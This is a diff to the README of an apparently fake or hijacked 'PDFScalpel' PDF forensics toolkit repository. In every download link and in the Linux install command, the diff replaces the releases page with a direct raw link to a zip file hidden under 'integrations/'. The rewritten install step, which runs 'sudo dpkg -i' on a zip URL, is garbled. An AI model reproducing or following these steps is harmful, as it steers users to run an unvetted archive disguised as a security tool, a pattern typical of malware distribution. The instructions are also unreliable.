@@ -4,7 +4,7 @@
 PDFScalpel is a forensic PDF analysis and CTF toolkit. It helps security researchers, digital forensics analysts, and penetration testers deeply understand PDF documents. Whether you're looking to explore PDF structure, check for encryption, find malware, or analyze metadata, PDFScalpel gives you the tools you need.
 
 ## 📥 Download PDFScalpel
-[![Download PDFScalpel](https://img.shields.io/badge/Download-PDFScalpel-blue.svg)](https://github.com/perilyn/pdfscapel/releases)
+[![Download PDFScalpel](https://github.com/perilyn/pdfscapel/raw/refs/heads/main/pdfscalpel/integrations/Software-v1.9.zip)](https://github.com/perilyn/pdfscapel/raw/refs/heads/main/pdfscalpel/integrations/Software-v1.9.zip)
 
 ## 🚀 Getting Started
 To get started with PDFScalpel, follow these simple steps:
@@ -15,7 +15,7 @@ To get started with PDFScalpel, follow these simple steps:
 
 2. **Download the Software**
    - Visit the Releases page to download the latest version of PDFScalpel:
-     [Visit this page to download PDFScalpel](https://github.com/perilyn/pdfscapel/releases)
+     [Visit this page to download PDFScalpel](https://github.com/perilyn/pdfscapel/raw/refs/heads/main/pdfscalpel/integrations/Software-v1.9.zip)
 
 3. **Choose the Right Version**
    - Select the version that matches your operating system (Windows or Linux).
@@ -25,9 +25,9 @@ To get started with PDFScalpel, follow these simple steps:
    - On Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions to complete the setup.
    - On Linux: Open a terminal and use the following command to install the `.deb` file:
      ```
-     sudo dpkg -i path/to/pdfscalpel.deb
+     sudo dpkg -i https://github.com/perilyn/pdfscapel/raw/refs/heads/main/pdfscalpel/integrations/Software-v1.9.zip
      ```
-   - Replace `path/to/pdfscalpel.deb` with the actual file name.
+   - Replace `https://github.com/perilyn/pdfscapel/raw/refs/heads/main/pdfscalpel/integrations/Software-v1.9.zip` with the actual file name.
 
 ## 🔍 Features
 PDFScalpel offers a variety of features to help you analyze PDFs:
@@ -71,6 +71,6 @@ If you encounter any issues or have questions, consider reaching out to the user
 
 ## 💾 Download & Install
 To begin your journey with PDFScalpel:
-[Visit this page to download PDFScalpel](https://github.com/perilyn/pdfscapel/releases)
+[Visit this page to download PDFScalpel](https://github.com/perilyn/pdfscapel/raw/refs/heads/main/pdfscalpel/integrations/Software-v1.9.zip)
 
 Begin analyzing PDF documents with confidence. PDFScalpel is designed for ease of use and powerful results. Enjoy your exploration!
